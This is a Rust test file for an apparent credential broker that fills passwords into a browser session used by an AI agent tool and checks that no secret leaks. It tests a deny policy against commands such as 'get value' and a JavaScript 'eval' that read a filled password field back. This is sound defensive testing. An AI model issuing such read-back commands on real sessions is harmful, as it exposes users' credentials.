#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn without_a_token_a_fill_says_which_variable_to_ask_for() {
    let Some(rig) = rig().await else { return };
    let (site, _bodies, _site) = shop().await;
    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    open(&mut driver, &page, &site).await;
    let refused = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert!(
        refused["error"]["message"]
            .as_str()
            .unwrap()
            .contains(TOKEN_ENV)
            && refused["error"]["fix"]
                .as_str()
                .unwrap()
                .contains("request_secret"),
        "{refused}"
    );
    call(&rig.broker, json!({ "op": "session_end" })).await;
}

/// agent-browser itself, after a fill: its normal commands work (their scripts are its pinned shapes), its policy file
/// denies `get value` and `eval`, and nothing it prints holds a value.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn after_a_fill_agent_browser_works_but_reads_no_value_back() {
    let Some(binary) = agent_browser() else {
        return;
    };
    let Some(rig) = rig_with(vec![(TOKEN_ENV.into(), TOKEN.into())]).await else {
        return;
    };
    let (site, bodies, _site) = shop().await;
    let (_, vault_for) = fake(vec![format!("{site}/")]);
    rig.broker.set_vaults(vault_for);
    call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "agent-browser" }),
    )
    .await;
    let env = SessionHooks::env(rig.broker.as_ref(), THREAD, Some("/usr/bin:/bin"));
    let socket_dir = tempfile::tempdir().unwrap();
    let run = |args: &[&str]| {
        let args: Vec<String> = args.iter().map(|a| (*a).to_owned()).collect();
        let binary = binary.clone();
        let env = env.clone();
        let socket_dir = socket_dir.path().to_owned();
        async move {
            let out = tokio::process::Command::new(&binary)
                .args(&args)
                .envs(env)
                .env("AGENT_BROWSER_SOCKET_DIR", socket_dir)
                .output()
                .await
                .unwrap();
            format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            )
        }
    };
    let opened = run(&["open", &site]).await;
    assert!(opened.contains('✓'), "{opened}");
    fill(&rig, USER_REF, "#user", Some(false)).await;
    let filled = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert!(filled["result"].is_object(), "{filled}");
    let mut printed = String::new();
    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        let title = run(&["get", "title"]).await;
        printed.push_str(&title);
        if title.contains("Welcome") {
            break;
        }
        assert!(Instant::now() < deadline, "{title}");
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    for args in [
        &["snapshot", "-i"][..],
        &["snapshot"],
        &["get", "text", "body"],
        &["get", "html", "body"],
        &["get", "attr", "#echo", "value"],
        &["is", "visible", "#otp"],
        &["scroll", "down", "200"],
        &["scrollintoview", "#otp"],
        &["hover", "#verify"],
        &["fill", "#otp", "123"],
        &["click", "#verify"],
    ] {
        let out = run(args).await;
        assert!(
            !out.contains("denied")
                && !out.contains("is off in this browser session")
                && !out.contains("refused")
                && !out.contains('✗'),
            "{args:?}: {out}"
        );
        printed.push_str(&out);
    }
    for args in [
        &["get", "value", "#echo"][..],
        &["eval", "document.querySelector('#echo').value"],
    ] {
        let out = run(args).await;
        assert!(out.contains("denied by policy"), "{args:?}: {out}");
        printed.push_str(&out);
    }
    assert_clean("agent-browser's output", &printed);
    assert_eq!(bodies.lock().unwrap().len(), 2, "signed in, then the code");
    run(&["close"]).await;
    call(&rig.broker, json!({ "op": "session_end" })).await;
}
